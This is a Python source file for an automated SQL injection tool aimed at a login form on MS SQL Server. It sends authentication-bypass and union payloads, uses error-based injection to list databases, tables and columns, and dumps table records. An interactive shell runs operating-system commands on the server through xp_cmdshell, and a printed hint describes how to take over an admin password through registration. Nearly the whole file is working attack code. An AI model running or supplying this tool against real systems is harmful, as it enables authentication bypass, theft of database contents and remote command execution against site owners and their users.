import requests
from prettytable import PrettyTable
from colorama import Fore, init
import sys

init()

def check_for_failed_login_attempt(text):
    for word in ['wrong', 'invalid', 'incorrect', 'bad']:
        if word in text:
            return True
    return False

def print_all_databases(dbs_dict):
    for db, tables in dbs_dict.items():
        print("\t\t\t# " + db + " #")
        tab = PrettyTable()
        for table, columns in tables.items():
            cols = []
            for column in columns:
                cols.append(column)
            while(len(cols) < 8):
                cols.append('')
            tab.add_column(table, cols)
        print(tab)

def print_records_from_table(db_name, table_name, columns, records_number):
    i = 0
    tab = PrettyTable()
    tab.field_names = columns
    select = '+\'|\'+'.join(['convert(nvarchar,'+col+')' for col in columns])
    while(i == 0 or req.status_code == 500 and i < records_number):
        req = requests.post(url, {"username": '\' or 1=(select top 1 '+select+' from "'+db_name+'".dbo.'+table_name+' where username not in(select top '+str(i)+' username from "'+db_name+'".dbo.'+table_name+'))--', "password": ''})
        try:
            start = req.text.index('\'')+1
            end = req.text.rindex('\'')
            #print(req.text[start:end])
            tab.add_row(req.text[start:end].split('|'))
            i += 1
        except ValueError:
            break
    print(Fore.MAGENTA + db_name + "." + table_name)        
    print(tab)
    print(Fore.GREEN)

url = 'http://localhost:5000/login'
vulnerable = False
payloads_worth_checking = []


#standard sql injection
admin_payload = ['admin\'--', 'admin\')--', 'admin\'))--', 'admin\')))--']

union_payload = ['\' union select 1, \'fictional_user\', \'fictional_password\'--']

basic_payloads = ["", "\'", '1\'', 'sq\'l']

simple_payload = "1\' or \'1\'=\'1"

comment_payloads = ["1\' or \'1\'=\'1\'--", "1\' or \'1\'=\'1\')--", "1\' or \'1\'=\'1\'))--", "1\' or \'1\'=\'1\')))--", "1\' or \'1\'=\'1\'-- -", "1\' or \'1\'=\'1\')-- -", "1\' or \'1\'=\'1\'))-- -", "1\' or \'1\'=\'1\')))-- -", "1\' or \'1\'=\'1\'#", "1\' or \'1\'=\'1\')#", "1\' or \'1\'=\'1\'))#", "1\' or \'1\'=\'1\')))#", "1\' or \'1\'=\'1\'# -", "1\' or \'1\'=\'1\')# -", "1\' or \'1\'=\'1\'))# -", "1\' or \'1\'=\'1\')))# -", "1\' or \'1\'=\'1\'\/*", "1\' or \'1\'=\'1\')\/*", "1\' or \'1\'=\'1\'))\/*", "1\' or \'1\'=\'1\')))\/*", "1\' or \'1\'=\'1\'\/* -", "1\' or \'1\'=\'1\')\/* -", "1\' or \'1\'=\'1\'))\/* -", "1\' or \'1\'=\'1\')))\/* -"]

#boolean injection
false_payload = ["1 and 1=2", "1\' and \'1\'=\'2\'"]
true_payload = ["1 and 1=1", "1\' and \'1\'=\'1\'"]

print(Fore.GREEN + "[+] starting scan for possible sql injections on " + url)

print("[+] testing for basic sql injections")
for payload_username in basic_payloads:
    for payload_password in basic_payloads:
        req = requests.post(url, {"username": payload_username, "password": payload_password})
        if req.status_code == 500:
            vulnerable = True

if not vulnerable:
    print(Fore.RED + "[-] " + url + " seems unvunerable to basic sql injections")

if vulnerable:
    req = requests.post(url, {"username": simple_payload, "password": simple_payload})
    if req.status_code == 302 or req.status_code == 200 and check_for_failed_login_attempt(req.text.lower()) == False:
        payloads_worth_checking.append(simple_payload)
        print(Fore.YELLOW + "[+] " + url + " may be vulerable to injection " + simple_payload)
    for payload in comment_payloads:
        req = requests.post(url, {"username": payload, "password": ""})
        if req.status_code == 200 or req.status_code == 302:
            payloads_worth_checking.append(payload)
            print(Fore.YELLOW + "[+] " + url + " may be vulerable to injection " + payload)

    print(Fore.GREEN + "[+] testing for union sql injections")
    for payload in union_payload:
        req = requests.post(url, {"username": payload, "password": ''})
        if req.status_code == 302 or req.status_code == 200 and check_for_failed_login_attempt(req.text.lower()) == False:
            payloads_worth_checking.append(payload)
            print(Fore.YELLOW + "[+] " + url + " may be vulerable to injection " + payload)


    print(Fore.GREEN + "[+] trying to retrive database version")
    req = requests.post(url, {"username": '\' or 1=(select @@version)--', "password": ''})
    if req.status_code == 500:
        start = req.text.index('\'')+1
        end = req.text.rindex('\'')
        version = req.text[start:end]
        print(Fore.YELLOW + "[+] retrived database version \n" + version)
    else:
        print(Fore.RED + "[-] retriving database version failed")


    print(Fore.GREEN + "[+] trying to retrive names of databases")
    dbs_dict = {}
    i = 0
    retrived = False
    while(i == 0 or req.status_code == 500):
        req = requests.post(url, {"username": '\' or 1=(select top 1 name from master..sysdatabases where name not in(select top '+ 
        str(i) +' name from master..sysdatabases))--', "password": ''})
        try:
            start = req.text.index('\'')+1
            end = req.text.rindex('\'')
            print(Fore.YELLOW + "[+] retrived name of database: " + req.text[start:end])
            dbs_dict[req.text[start:end]] = {}
            retrived = True
            i += 1
        except ValueError:
            break

    if retrived:
        print(Fore.CYAN + "[+] removing databases that dont belong to user: master, tempdb, msdb, model")
        for db in ['master', 'tempdb', 'msdb', 'model']:
            dbs_dict.pop(db)
    else:
        print(Fore.RED + "[-] failed to retrive names of databases")

    print(Fore.GREEN + "[+] trying to retrive table names of each database")
    for db in dbs_dict.keys():
        retrived = False
        print(Fore.YELLOW + "[+] retrieving tables from " + db + " ...")
        i = 0
        while(i == 0 or req.status_code == 500):
            req = requests.post(url, {"username": '\' or 1=(select top 1 name from "' + db +'"..sysobjects where xtype=\'U\' and name not in (select top ' + str(i) + ' name from "'+ db +'"..sysobjects where xtype=\'U\'))--', "password": ''})
            try:
                start = req.text.index('\'')+1
                end = req.text.rindex('\'')
                dbs_dict[db][req.text[start:end]] = []
                retrived = True
                i += 1
            except ValueError:
                break
        if not retrived:
            print(Fore.RED + "[-] failed to retrive names of tables")

    print(Fore.GREEN + "[+] trying to retrive columns of each table from all databases")
    for db, tables in dbs_dict.items():
        for table in tables.keys():
            retrived = False
            print(Fore.YELLOW + "[+] retrieving columns from " + db + "." + table + " ...")
            i = 0
            while(i == 0 or req.status_code == 500):
                req = requests.post(url, {"username": '\' or 1=(SELECT top 1"'+db+'"..syscolumns.name FROM "'+db+'"..syscolumns, "'+db+'"..sysobjects  WHERE "'+db+'"..syscolumns.id="'+db+'"..sysobjects.id AND "'+db+'"..sysobjects.name=\''+table+'\' AND "'+db+'"..syscolumns.name NOT IN  (SELECT top '+str(i)+' "'+db+'"..syscolumns.name FROM "'+db+'"..syscolumns, "'+db+'"..sysobjects  WHERE "'+db+'"..syscolumns.id="'+db+'"..sysobjects.id AND "'+db+'"..sysobjects.name=\''+table+'\'))--', "password": ''})
                try:
                    start = req.text.index('\'')+1
                    end = req.text.rindex('\'')
                    dbs_dict[db].setdefault(table, []).append(req.text[start:end])
                    i += 1
                    retrived = True
                except ValueError:
                    break
            if not retrived:
                print(Fore.RED + "[-] failed to retrive names of columns for table " + table + " in databse " + db)

#//if vulnerable

print(Fore.CYAN + "[+] If registration and changing password is possible and none of the sql injection attack above worked try to inject as username admin\'-- and as password password. [if succesfull password for admin will be changed]")

if vulnerable:
    print(Fore.GREEN +'[+] type help to print avaible commands')
commands = {'help' : 'exit\t\t\t\t\t\t\t\t- exit the program\nshow\t\t\t\t\t\t\t\t- printing specified table from database with number of rows\nexec [result won\'t be showed]\t\t\t\t\t- executing shell command\nlist\t\t\t\t\t\t\t\t- lists databases with table and columns\npayloads\t\t\t\t\t\t\t- prints payloads that may work on specified url'}
while(True and vulnerable):
    cmd = input('sqli> ')
    if cmd == 'help':
        print(commands['help'])
    elif cmd == 'exit':
        sys.exit(0)
    elif cmd == 'show':
        db = input('db: ')
        table = input('table: ')
        columns = input('columns: ')
        print('all to print all rows from table')
        records = input('records: ')
        if records == 'all':
            records = int(sys.maxsize)
        records = int(records)
        columns = columns.split(',')
        print_records_from_table(db, table, columns, records)
    elif cmd == 'list':
        for db, tables in dbs_dict.items():
            print(Fore.CYAN)
            print(db)
            print(tables)
            print(Fore.GREEN)
    elif cmd == 'payloads':
        for payload in payloads_worth_checking:
            print(payload)
    elif cmd == 'exec':
        command = input('command: ')
        requests.post(url, {'username': '\'; exec master..xp_cmdshell \''+command+'\';--', 'password': ''})
